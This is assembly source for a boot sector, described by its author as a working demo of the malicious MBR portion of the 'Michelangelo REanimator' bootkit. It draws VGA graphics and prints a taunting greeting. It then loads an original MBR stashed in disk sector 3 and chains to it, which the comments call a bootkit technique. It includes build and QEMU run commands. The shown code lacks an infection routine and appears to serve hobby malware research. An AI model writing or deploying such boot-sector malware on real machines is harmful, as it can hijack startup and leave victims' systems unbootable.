[BITS 16]
;.286			;masm specific
;.MODEL TINY		;masm specific

;******************************************************************************
;	This is the working demo of part of the malicious MBR/boot sector portion
; 	of the Michelangelo REanimator bootkit
;	
;	Use at your own risk. 
;	*Plz dont dd your primary hd partition with this. 
;	This is a functional boot sector that will hang once it hits the 
;	last function
;	It was written as a way to test the graphics functionality of my
;	Michelangelo REanimator project
;	There is no functionality in this boot sector to jump to a loaded
; 	valid MBR, or to a valid boot sector
;		
;	To assemble (with nasm):
;	nasm -f bin -o michelange_grafx_routines.mbr michelange_grafx_routines.mbr
;	
;	To run;
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img 
;	Note: the -rtc -device and -display flag values are all based on what 
;   I've used on my own machine as configurations that work well for my use cases.  
;   You may need to adjust them as needed for your own host machine and 
;   what you have installed.
;	To run in a debug session with GDB attached:
;	qemu-system-i386 -m 16 -rtc base=localtime -device cirrus-vga -display gtk -hda dos_rip.img -s -S
;	(see debugging notes for details on setup of GDBi/Bochs session) 
;
;
;******************************************************************************


;******************************************************************************
SCREEN_WIDTH		equ	0x140							;;320
SCALED_SCREEN_MAX	equ SCALED_SCREEN_W*SCALED_SCREEN_H
SCALED_SCREEN_W		equ	0x80			;;128
SCALED_SCREEN_H		equ	0x50			;;80 
OFFSET_SCREEN_H		equ ((SCALED_SCREEN_H+0x10)*SCALED_SCREEN_W)
;OFFSET_SCREEN_H		equ SCALED_SCREEN_H+SCREEN_WIDTH
;NEWSPRITE_AREA		equ	0x2800
SPRITE_AREA			equ	0x3200		;area of sprite is 0x2800; add 0x400 padding
NEWSPRITE_AREA		equ	0x2800*SCALE_MULTIPLIER
SCALE_MULTIPLIER	equ 4

VGA_PAL_INDEX		equ	0x3C8
VGA_PAL_DATA		equ	0x3C9
;******************************************************************************
org 0x0 

vga_init:
;;*here	pop si
;;*here	push si	
	mov	ax, 0x06
	int	10h
	mov	ax,0xA000
	mov	es,ax
	mov	dx,ax
	mov	di,0
	mov	ax, 0x13
	int	10h
	cld


gen_rand_num:
	push ax
	push es
	xor ax, ax
	mov es,ax
	mov ax, es:[46Ch] ;offset of var for internal timer in BPB
	mov [randtimer], al
	mov [randshiftnum], ah
	pop es
	pop ax
	cmp word [randtimer], 10
	jge gen_rand_shifts
	mov dx, ax
	shl dx, 1
	mov [randshift0], dx

gen_rand_shifts:
	push ax
	mov ax, [randtimer]
	add ax, [randshiftnum]
	mov [randshift0], ax
	pop ax
	jmp paint_setup
;;	randshift0 equ (randtimer+randshiftnum)

;******************************************************************************
;	Palette routine adapted from "Symetrie" and "Atraktor" by Rrrola
;	 https://abaddon.hu/256b/colors.html 
;
;******************************************************************************


set_pal:
	salc				;set carry flag in al, if carry flag set, al=0
	mov	dx, VGA_PAL_INDEX	;
	out	dx, al
	inc	dx
	pal_1:
		push ax
		push cx
		or	ax, 0000111100110011b
		shr	ax, 10
		mov cl, [randshift0]
		xor al, cl
		out	dx, al
		mul	al
		mov cl, [randshift1]
		shl ax, cl
		shl	ax, 6
		out dx,al
		pop	cx
		pop	ax
		mov [crypt_key], ax
		out	dx,al
		inc	ax
		jnz	pal_1


paint_setup:
;*here*	pop si
	;push si
	mov	cx, SCALED_SCREEN_W
	;shr cx, 4
	xor di, di
	paint_loop:
		push 	di
		push	cx
		mbr_paint:
			mov si, $VXPaintBuffer+3
			push si
			push cs
			pop ds
			
			mov bx, SCALED_SCREEN_MAX
			vga_mbr_y:
				push di
				mov dx, SCALED_SCREEN_W
				vga_mbr_x:
					mov ax, ds:[si]
					xor ax, es:[di]
					;or ax, es:[di]
					;and al, 11111111b
					add al, 0x0F
					and al, [randtimer]
					;sub al, [randshiftnum]
					;xor ax, es:[di]
					xor al, es:[di]
					;xor al, es:[di]
					mov es:[di], al
					inc si
					inc di
					dec dx
					jnz vga_mbr_x
				pop di
				add di, SCREEN_WIDTH
				;add di, SCALED_SCREEN_W
				;sub bx, (SCALED_SCREEN_W >> 2)
				dec bx
				jnz vga_mbr_y
			pop si
;		xor cx, cx
;		mov dx, 0705h
;		mov ah, 86h
;		int 15h
		
		pop		cx
		pop 	di
		add di, OFFSET_SCREEN_H
	;	add di, SCALED_SCREEN_H
		dec 	cx
		jnz	paint_loop

rsvp:
	mov cx, greetz_len
	mov si, greetz
message:
	push cs
	pop ds
welcome:
	mov al, ds:[si]
	mov bh, 0x0
	mov bl, 0x0a
	mov ah, 0x0E
	int 0x10
	inc si
	dec cx
	jnz welcome

;******************************************************************************
;
;	Reads char from buffer (function 0h,int16h)
; 	Char returned in al
; 	If char in al, load original saved MBR from sector 3 to 0x1fe:0x7c00
;	and jump to it
;	Else, do nothing and wait (continue showing VGA drawing)
;
;******************************************************************************
key_check:
	xor	ax,ax
	int	16h
	cmp	al, 1
	jmp	load_og_mbr

;******************************************************************************
;
;	hlt infinite loop
;	xoxo
;
;******************************************************************************
baibai:
	hlt
	jmp baibai

load_og_mbr:
	xchg bx, bx
	xor ax, ax		;reset disk
	int 13h
;	mov ax, 0x07c0
;	mov ax, 0x01fe
	xor ax, ax

;The FreeDOS MBR actually relocates itself to high-mem 
;(common bootkit technique, though also a common bootloader technique generally)
;Thus the segment of the MBR code should actually be loaded to 0x1fe0 
; so that the jump during FreeDOS MBR execution does not fail
; Due to how segmented addressing works, this means that 
; we have to load the segment register with 0x01fe
;The final address will be derived by performing a logical right shift 
; on the segment register, by a factor of 4 (shr 4 means segment * 2^4)
; So, final address is (0x1fe >> 4) + 0x7c00= 0x1fe0:0x7c00

	mov es, ax
	mov ds, ax
	mov di, 0x7c00
	xor si, si
	xor ax, ax
read_sector:
	mov ax, 0x0201	;read one sectors of disk
	mov ch, 0
	mov cl, 3		;cylinder 0, sector 3 
	mov dh, 0x0 	;from Side 0, drive C:, but qemu loads this disk as dx == 0
	lea bx, [es:di]
	int 13h
	
	mov cx, 0x100
	push cx
	
	; copy original MBR to two locations:
	;	1. 0x01fe:0x7c00 (high memory location of MBR, loaded at standard 0x7c00 offset)
	;	2. 0x0:0x7c00 "typical" address for MBR load on boot; also the address where
	;	   the FreeDOS boot sector expects to find a copy of its original MBR
	;	   if our vx MBR is still at 0x0:0x7c00, then we enter an infinite loop
	;      due to the implementation of the FreeDOS MBR
	; copying the original MBR twice here attempts to solve that niche problem
	copy_sector_loop:
		mov word ax, [bx]
		stosw
		add bx, 2
		dec cx
		cmp cx, 0
		jnz copy_sector_loop
	cmp byte [repeat_check], 0x1
	jz fin

	pop cx
	xor ax, ax
	mov es, ax
	mov ds, ax
	xor si, si
	mov byte [repeat_check], 0x1
	jmp copy_sector_loop

fin:
	jmp bootfinal:bootfinaloff

;	jmp bootfinal:0


;bootfinal equ 0x07c0
;bootfinal equ 0x01fe
bootfinal equ 0x0
bootfinaloff equ 0x7c00


greetz:
	db "u know u luv me", 0Dh, 0Ah
	db "xoxo", 0Dh, 0Ah
	db "ic3qu33n", 0Dh, 0Ah
greetz_len	equ $-greetz

crypt_key:
	dw 0

repeat_check:
	db 0x0
	
randtimer:
	db 0

randshiftnum:
	db 0

randshift0:
	db 0

randshift1 equ (randshift0 - 2)
	
VXend:
	times 512-($-$$) db 0

mbr_buffer:
	times 512-($-$$) db 0

VXPaintstart equ $+3

